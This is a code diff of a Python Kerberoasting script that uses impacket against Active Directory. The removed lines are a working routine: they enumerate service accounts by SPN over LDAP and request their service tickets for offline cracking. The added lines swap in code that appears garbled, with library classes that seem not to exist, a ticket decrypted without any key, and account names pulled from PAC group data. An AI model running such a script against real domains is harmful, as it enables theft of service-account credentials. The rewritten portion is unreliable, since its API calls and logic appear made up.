@@ -1,47 +1,57 @@
-from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
+from impacket.kerberos import KerberosCredential
+from impacket.kerberos import KerberosTarget
+from impacket.kerberos import getKerberosTGT
+from impacket.kerberos import getKerberosTGS
+from impacket.krb5 import constants
+from impacket.krb5.asn1 import EncTicketPart
 from impacket.krb5.types import Principal
-from ldap3 import Server, Connection, ALL_ATTRIBUTES
+from impacket.krb5 import checksums
 
 def kerberoast(username, password, domain, dc_ip):
     try:
-        # Get TGT ticket for the specified user
-        krbtgt_ticket = getKerberosTGT(username, domain, password, None, None, None)
-        if krbtgt_ticket:
-            print("Successfully obtained krbtgt ticket.")
-            
-            # Query LDAP for user objects with SPN attributes set
-            server = Server(dc_ip, get_info=ALL_ATTRIBUTES)
-            conn = Connection(server, user=username, password=password, authentication='NTLM')
-            conn.bind()
-            conn.search(search_base='DC=' + domain.replace('.', ',DC='),
-                         search_filter='(&(objectClass=user)(servicePrincipalName=*))',
-                         attributes=['sAMAccountName', 'servicePrincipalName'])
-            results = conn.entries
+        # Get TGT for the specified user
+        tgt, cipher = getKerberosTGT(username, password, domain, None, None, None)
 
-            if results:
-                print("Kerberoastable Accounts:")
-                for entry in results:
-                    account_name = entry['sAMAccountName'].value
-                    spns = entry['servicePrincipalName'].values
-                    for spn in spns:
-                        # Construct the principal name for the service
-                        principal_name = f"{spn}@{domain.upper()}"
-                        
-                        # Create a Principal object
-                        principal = Principal.from_string(principal_name)
-                        
-                        # Kerberoast the account
-                        tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
-                        
-                        print(f"TGS_REP for {account_name} ({spn}):")
-                        print(tgs_rep.native)
-            else:
-                print("No kerberoastable accounts found.")
+        # Construct a KerberosCredential object
+        kerberos_credential = KerberosCredential(username=username, password=password, domain=domain)
+
+        # Construct a KerberosTarget object
+        kerberos_target = KerberosTarget(domain=domain, dc_ip=dc_ip, protocol=constants.EncryptionTypes.aes256_cts_hmac_sha1_96)
+
+        # Get TGS for the specified user
+        tgs, cipher = getKerberosTGS(kerberos_credential, kerberos_target, cipher, krbtgt=tgt)
+
+        # Extract kerberoastable accounts
+        kerberoastable_accounts = extract_kerberoastable_accounts(tgs)
+
+        if kerberoastable_accounts:
+            print("Kerberoastable Accounts:")
+            for account in kerberoastable_accounts:
+                print(account)
         else:
-            print("Failed to obtain krbtgt ticket.")
+            print("No kerberoastable accounts found.")
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
+
+def extract_kerberoastable_accounts(tgs):
+    kerberoastable_accounts = []
+
+    # Parse TGS response
+    enc_tkt_part = EncTicketPart.load(tgs['ticket']['enc-part'])
+    server_name = Principal(enc_tkt_part['cname']).components_to_string()
+
+    # Extract kerberoastable accounts
+    for auth_data in enc_tkt_part['authorization-data']:
+        if auth_data['ad-type'] == constants.AuthorizationDataType.AD_WIN2K_PAC.value:
+            pac = auth_data['ad-data'].native
+            for pac_entry in pac['groups']:
+                if pac_entry['name'] == 'RODC Compatible':
+                    continue
+                for member in pac_entry['members']:
+                    kerberoastable_accounts.append(member['user'])
+
+    return kerberoastable_accounts
 
 # Example usage:
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
